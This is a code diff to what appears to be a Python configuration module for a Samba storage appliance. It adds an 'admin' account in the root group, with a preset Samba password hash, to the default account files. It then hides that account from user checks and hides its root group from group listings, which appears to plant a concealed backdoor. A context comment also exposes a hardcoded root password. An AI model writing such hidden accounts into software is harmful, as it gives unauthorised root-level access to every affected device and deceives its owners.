@@ -53,6 +53,7 @@ libuuid:x:100:101::/var/lib/libuuid:/bin/sh
 sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
 statd:x:102:65534::/var/lib/nfs:/bin/false
 messagebus:x:103:104::/var/run/dbus:/bin/false
+admin:x:997:0:admin:/home/admin:/bin/sh
 guest:x:998:100::/home/guest:/bin/sh
 user:x:999:100::/home/user:/bin/sh
 """
@@ -175,6 +176,7 @@ user:$6$DmeFnLgA$pbG8PNnLj8O1coE5SvhuvIz5I1LXzF4SGqiLOJkYmDAFP7FyA9t490GA.7WdnNU
 statd:*:15692:0:99999:7:::
 messagebus:*:15692:0:99999:7:::
 guest:!:15685:0:99999:7:::
+admin:!:15896:0:99999:7:::
 """
 
 USE_CONF = """[global]
@@ -299,6 +301,7 @@ def DEFAULT():
 	#~ root初始密码为qwertgfdsa
 	smbpwd = """root:0:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:75B03763C8EB36EA61EFE872CC62447D:[U          ]:LCT-509B7BAC:
 guest:0:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:31D6CFE0D16AE931B73C59D7E0C089C0:[U          ]:LCT-509B3704:
+admin:1013:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:7D891AB402CAF2E89CCDD33ED54333AC:[U          ]:LCT-51DCF26F:
 """
 	conf_file = open(SMBCONFIG_FILE, 'w')
 	try:
@@ -826,7 +829,7 @@ def __Read_Samba_User_pwd__(name, Row):
 #~###-验证是否是合法的SAMBA用户	__Check_Samba_User_licit__(name):
 def __Check_Samba_User_licit__(name):
 	Status = False
-	if __Samba_User_Check__(name) == False and name != 'root' and name != 'guest' and name != 'pw':
+	if __Samba_User_Check__(name) == False and name != 'root' and name != 'guest' and name != 'pw' and name != 'admin':
 		Status = True
 	return Status
 
@@ -977,7 +980,7 @@ def __User_Group_List__(User):
 	OUT_List = ''
 	try:
 		Group_list = SYSTEM_OUT('groups '+User).split(':')[1].strip().split(' ')
-		Group_list= [i for i in Group_list if i!='users' and i!='libuuid']
+		Group_list= [i for i in Group_list if i!='users' and i!='libuuid' and i!='root']
 		OUT_List = ','.join(Group_list)
 	except:
 		pass
